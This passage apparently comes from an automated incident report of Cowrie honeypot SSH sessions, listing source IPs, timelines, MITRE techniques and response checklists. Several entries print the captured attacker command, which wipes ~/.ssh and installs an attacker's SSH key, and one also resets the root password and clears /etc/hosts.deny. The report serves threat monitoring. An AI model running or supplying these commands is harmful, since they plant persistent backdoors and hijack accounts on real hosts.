| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:54:23` | `cowrie.session.connect` |
| `2026-04-06 06:54:23` | `cowrie.client.version` |
| `2026-04-06 06:54:23` | `cowrie.client.kex` |
| `2026-04-06 06:54:25` | `cowrie.login.success` |
| `2026-04-06 06:54:25` | `cowrie.session.params` |
| `2026-04-06 06:54:25` | `cowrie.command.input` |
| `2026-04-06 06:54:25` | `cowrie.command.failed` |
| `2026-04-06 06:54:26` | `cowrie.log.closed` |
| `2026-04-06 06:54:26` | `cowrie.session.params` |
| `2026-04-06 06:54:26` | `cowrie.command.input` |
| `2026-04-06 06:54:27` | `cowrie.session.file_download` |
| `2026-04-06 06:54:27` | `cowrie.log.closed` |
| `2026-04-06 06:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d7e47661a00

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:54 |
| **Last Seen** | 2026-04-06 06:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:54:30` | `cowrie.session.connect` |
| `2026-04-06 06:54:30` | `cowrie.client.version` |
| `2026-04-06 06:54:30` | `cowrie.client.kex` |
| `2026-04-06 06:54:32` | `cowrie.login.success` |
| `2026-04-06 06:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af4e3b96311

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:55 |
| **Last Seen** | 2026-04-06 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:55:30` | `cowrie.session.connect` |
| `2026-04-06 06:55:30` | `cowrie.client.version` |
| `2026-04-06 06:55:30` | `cowrie.client.kex` |
| `2026-04-06 06:55:30` | `cowrie.login.success` |
| `2026-04-06 06:55:30` | `cowrie.session.params` |
| `2026-04-06 06:55:30` | `cowrie.command.input` |
| `2026-04-06 06:55:30` | `cowrie.command.failed` |
| `2026-04-06 06:55:30` | `cowrie.log.closed` |
| `2026-04-06 06:55:30` | `cowrie.session.params` |
| `2026-04-06 06:55:30` | `cowrie.command.input` |
| `2026-04-06 06:55:30` | `cowrie.session.file_download` |
| `2026-04-06 06:55:30` | `cowrie.log.closed` |
| `2026-04-06 06:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b85c217db60

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:55 |
| **Last Seen** | 2026-04-06 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:55:31` | `cowrie.session.connect` |
| `2026-04-06 06:55:31` | `cowrie.client.version` |
| `2026-04-06 06:55:31` | `cowrie.client.kex` |
| `2026-04-06 06:55:32` | `cowrie.login.success` |
| `2026-04-06 06:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6f99f4fd26

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:56 |
| **Last Seen** | 2026-04-06 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:56:31` | `cowrie.session.connect` |
| `2026-04-06 06:56:31` | `cowrie.client.version` |
| `2026-04-06 06:56:31` | `cowrie.client.kex` |
| `2026-04-06 06:56:31` | `cowrie.login.success` |
| `2026-04-06 06:56:31` | `cowrie.session.params` |
| `2026-04-06 06:56:31` | `cowrie.command.input` |
| `2026-04-06 06:56:31` | `cowrie.command.failed` |
| `2026-04-06 06:56:31` | `cowrie.log.closed` |
| `2026-04-06 06:56:31` | `cowrie.session.params` |
| `2026-04-06 06:56:31` | `cowrie.command.input` |
| `2026-04-06 06:56:31` | `cowrie.session.file_download` |
| `2026-04-06 06:56:31` | `cowrie.log.closed` |
| `2026-04-06 06:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ebd01e72935

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:56 |
| **Last Seen** | 2026-04-06 06:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:56:32` | `cowrie.session.connect` |
| `2026-04-06 06:56:32` | `cowrie.client.version` |
| `2026-04-06 06:56:32` | `cowrie.client.kex` |
| `2026-04-06 06:56:32` | `cowrie.login.success` |
| `2026-04-06 06:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da0fd5cd7f6e

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:59 |
| **Last Seen** | 2026-04-06 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:59:40` | `cowrie.session.connect` |
| `2026-04-06 06:59:40` | `cowrie.client.version` |
| `2026-04-06 06:59:40` | `cowrie.client.kex` |
| `2026-04-06 06:59:40` | `cowrie.login.success` |
| `2026-04-06 06:59:40` | `cowrie.session.params` |
| `2026-04-06 06:59:40` | `cowrie.command.input` |
| `2026-04-06 06:59:40` | `cowrie.command.failed` |
| `2026-04-06 06:59:40` | `cowrie.log.closed` |
| `2026-04-06 06:59:40` | `cowrie.session.params` |
| `2026-04-06 06:59:40` | `cowrie.command.input` |
| `2026-04-06 06:59:40` | `cowrie.session.file_download` |
| `2026-04-06 06:59:40` | `cowrie.log.closed` |
| `2026-04-06 06:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d2c550fec37

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:59 |
| **Last Seen** | 2026-04-06 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:59:41` | `cowrie.session.connect` |
| `2026-04-06 06:59:41` | `cowrie.client.version` |
| `2026-04-06 06:59:41` | `cowrie.client.kex` |
| `2026-04-06 06:59:41` | `cowrie.login.success` |
| `2026-04-06 06:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc865a2a826e

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 07:00 |
| **Last Seen** | 2026-04-06 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:00:44` | `cowrie.session.connect` |
| `2026-04-06 07:00:44` | `cowrie.client.version` |
| `2026-04-06 07:00:44` | `cowrie.client.kex` |
| `2026-04-06 07:00:44` | `cowrie.login.success` |
| `2026-04-06 07:00:44` | `cowrie.session.params` |
| `2026-04-06 07:00:44` | `cowrie.command.input` |
| `2026-04-06 07:00:44` | `cowrie.command.failed` |
| `2026-04-06 07:00:44` | `cowrie.log.closed` |
| `2026-04-06 07:00:44` | `cowrie.session.params` |
| `2026-04-06 07:00:44` | `cowrie.command.input` |
| `2026-04-06 07:00:44` | `cowrie.session.file_download` |
| `2026-04-06 07:00:44` | `cowrie.log.closed` |
| `2026-04-06 07:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3869d59fd49

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 07:00 |
| **Last Seen** | 2026-04-06 07:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:00:45` | `cowrie.session.connect` |
| `2026-04-06 07:00:45` | `cowrie.client.version` |
| `2026-04-06 07:00:45` | `cowrie.client.kex` |
| `2026-04-06 07:00:45` | `cowrie.login.success` |
| `2026-04-06 07:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44cb8286854b

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 07:01 |
| **Last Seen** | 2026-04-06 07:06 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:01:10` | `cowrie.session.connect` |
| `2026-04-06 07:01:10` | `cowrie.client.version` |
| `2026-04-06 07:01:10` | `cowrie.client.kex` |
| `2026-04-06 07:01:11` | `cowrie.login.success` |
| `2026-04-06 07:01:12` | `cowrie.session.params` |
| `2026-04-06 07:01:12` | `cowrie.command.input` |
| `2026-04-06 07:01:12` | `cowrie.command.failed` |
| `2026-04-06 07:01:12` | `cowrie.log.closed` |
| `2026-04-06 07:01:13` | `cowrie.session.params` |
| `2026-04-06 07:01:13` | `cowrie.command.input` |
| `2026-04-06 07:01:13` | `cowrie.session.file_download` |
| `2026-04-06 07:01:13` | `cowrie.log.closed` |
| `2026-04-06 07:06:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dc72eed2e72

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 07:01 |
| **Last Seen** | 2026-04-06 07:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:01:18` | `cowrie.session.connect` |
| `2026-04-06 07:01:18` | `cowrie.client.version` |
| `2026-04-06 07:01:18` | `cowrie.client.kex` |
| `2026-04-06 07:01:19` | `cowrie.login.success` |
| `2026-04-06 07:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8baf48c7cc51

| Field | Detail |
|---|---|
| **Source IP** | `103.159.54[.]61` |
| **First Seen** | 2026-04-06 07:43 |
| **Last Seen** | 2026-04-06 07:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:43:09` | `cowrie.session.connect` |
| `2026-04-06 07:43:09` | `cowrie.client.version` |
| `2026-04-06 07:43:09` | `cowrie.client.kex` |
| `2026-04-06 07:43:09` | `cowrie.login.success` |
| `2026-04-06 07:43:10` | `cowrie.session.params` |
| `2026-04-06 07:43:10` | `cowrie.command.input` |
| `2026-04-06 07:43:10` | `cowrie.command.failed` |
| `2026-04-06 07:43:10` | `cowrie.log.closed` |
| `2026-04-06 07:43:10` | `cowrie.session.params` |
| `2026-04-06 07:43:10` | `cowrie.command.input` |
| `2026-04-06 07:43:10` | `cowrie.session.file_download` |
| `2026-04-06 07:43:10` | `cowrie.log.closed` |
| `2026-04-06 07:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.159.54[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.159.54[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc915f664d2

| Field | Detail |
|---|---|
| **Source IP** | `103.159.54[.]61` |
| **First Seen** | 2026-04-06 07:43 |
| **Last Seen** | 2026-04-06 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:43:12` | `cowrie.session.connect` |
| `2026-04-06 07:43:12` | `cowrie.client.version` |
| `2026-04-06 07:43:12` | `cowrie.client.kex` |
| `2026-04-06 07:43:13` | `cowrie.login.success` |
| `2026-04-06 07:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.159.54[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.159.54[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5969a11c09f7

| Field | Detail |
|---|---|
| **Source IP** | `135.235.138[.]43` |
| **First Seen** | 2026-04-06 07:43 |
| **Last Seen** | 2026-04-06 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:43:56` | `cowrie.session.connect` |
| `2026-04-06 07:43:56` | `cowrie.client.version` |
| `2026-04-06 07:43:56` | `cowrie.client.kex` |
| `2026-04-06 07:43:56` | `cowrie.login.success` |
| `2026-04-06 07:43:56` | `cowrie.session.params` |
| `2026-04-06 07:43:56` | `cowrie.command.input` |
| `2026-04-06 07:43:56` | `cowrie.command.failed` |
| `2026-04-06 07:43:56` | `cowrie.log.closed` |
| `2026-04-06 07:43:56` | `cowrie.session.params` |
| `2026-04-06 07:43:56` | `cowrie.command.input` |
| `2026-04-06 07:43:56` | `cowrie.session.file_download` |
| `2026-04-06 07:43:56` | `cowrie.log.closed` |
| `2026-04-06 07:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.235.138[.]43` to AbuseIPDB if not already reported
- [ ] Block `135.235.138[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5439ec09a42a

| Field | Detail |
|---|---|
| **Source IP** | `135.235.138[.]43` |
| **First Seen** | 2026-04-06 07:43 |
| **Last Seen** | 2026-04-06 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:43:57` | `cowrie.session.connect` |
| `2026-04-06 07:43:57` | `cowrie.client.version` |
| `2026-04-06 07:43:57` | `cowrie.client.kex` |
| `2026-04-06 07:43:57` | `cowrie.login.success` |
| `2026-04-06 07:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.235.138[.]43` to AbuseIPDB if not already reported
- [ ] Block `135.235.138[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bacfb05097af

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]248` |
| **First Seen** | 2026-04-06 07:46 |
| **Last Seen** | 2026-04-06 07:46 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:f6E5NewRSyFB"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
